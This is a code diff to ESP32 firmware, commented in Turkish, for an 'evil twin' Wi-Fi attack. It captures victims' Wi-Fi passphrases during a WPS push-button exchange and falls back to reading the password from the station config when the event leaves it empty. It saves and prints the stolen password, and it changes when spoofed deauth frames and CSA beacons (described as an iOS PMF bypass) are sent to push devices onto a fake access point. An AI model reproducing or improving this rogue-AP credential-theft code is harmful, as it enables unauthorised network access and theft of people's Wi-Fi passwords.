@@ -136,12 +136,21 @@ static void et_wps_pbc_loop() {
     esp_wifi_wps_disable();
 
     String pw = String(et_wps_pbc_pass);
+    // Bazı routerlar plaintext passphrase'i WPS event'te göndermez;
+    // WiFi STA config'den fallback olarak oku (IDF WiFi stack bunu doldurur)
+    if (pw.length() == 0) {
+      wifi_config_t sta_cfg = {};
+      if (esp_wifi_get_config(WIFI_IF_STA, &sta_cfg) == ESP_OK) {
+        pw = String((char *)sta_cfg.sta.password);
+      }
+    }
     if (pw.length() > 0) {
       passwords_save(evil_twin_ssid, pw);
       DEBUG_PRINT("ET WPS PBC basarili! Sifre: ");
       DEBUG_PRINTLN(pw);
-      // Şifreyi gerçek AP'de doğrula (arka planda, AP çalışmaya devam eder)
       evil_twin_test_password(pw);
+    } else {
+      DEBUG_PRINTLN("ET WPS PBC: passphrase bos, kaydetme atlandi");
     }
     // Başarı sayfasının kurban tarafından alınmasına yetecek süre bekle,
     // sonra sahte AP'yi kapat. 8 saniye: JS 4s'de polling yapar + sayfa yükleme.
@@ -519,17 +528,23 @@ void evil_twin_loop() {
 
   unsigned long now = millis();
 
-  // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
-  if (now - et_last_csa >= CSA_INTERVAL_MS) {
-    et_last_csa = now;
-    et_send_csa_beacon();
-  }
+  // WPS PBC el sıkışması aktifken deauth/CSA GÖNDERİLMEZ.
+  // Deauth ve raw frame enjeksiyonu, STA arayüzünün gerçek AP ile
+  // kurduğu WPS müzakerelerini bozar — özellikle AP→STA ve STA→AP
+  // spoof deauth'lar AP'nin bağlantı durumunu sıfırlar.
+  if (!et_wps_pbc_running) {
+    // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
+    if (now - et_last_csa >= CSA_INTERVAL_MS) {
+      et_last_csa = now;
+      et_send_csa_beacon();
+    }
 
-  // Proaktif deauth: her ET_DEAUTH_INTERVAL_MS ms'de bir
-  // Hedef cihazı gerçek AP'ye bağlanmadan önce düşürür → sahte AP'ye yönlendirir
-  if (now - et_last_deauth >= ET_DEAUTH_INTERVAL_MS) {
-    et_last_deauth = now;
-    et_send_proactive_deauth();
+    // Proaktif deauth: her ET_DEAUTH_INTERVAL_MS ms'de bir
+    // Hedef cihazı gerçek AP'ye bağlanmadan önce düşürür → sahte AP'ye yönlendirir
+    if (now - et_last_deauth >= ET_DEAUTH_INTERVAL_MS) {
+      et_last_deauth = now;
+      et_send_proactive_deauth();
+    }
   }
 
   // Hedef yeniden bulma: RETRACK_INTERVAL_MS'de bir
